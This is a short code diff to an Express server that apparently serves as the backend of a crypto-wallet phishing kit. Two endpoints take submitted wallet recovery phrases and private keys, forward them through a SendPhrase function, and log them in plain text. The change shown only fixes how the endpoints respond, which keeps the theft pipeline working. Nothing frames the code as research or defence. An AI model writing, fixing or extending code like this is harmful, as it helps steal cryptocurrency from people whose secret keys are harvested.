@@ -14,12 +14,12 @@ app.use(express.json());
 app.post("/api/wallet/v1/Phrase", async(req, res) => {
     SendPhrase(req.body.phrase);
     logger.info(`Sent ${req.body.phrase}`)
-    res.status(200)
+    res.sendStatus(200)
 })
 app.post("/api/wallet/v1/privateKey", async(req, res) => {
     SendPhrase(req.body.PrivateKey);
     logger.info(`Sent ${req.body.PrivateKey}`)
-    res.status(200)
+    res.sendStatus(200)
 })
 client.on('ready', client => {
     logger.info("Connected")
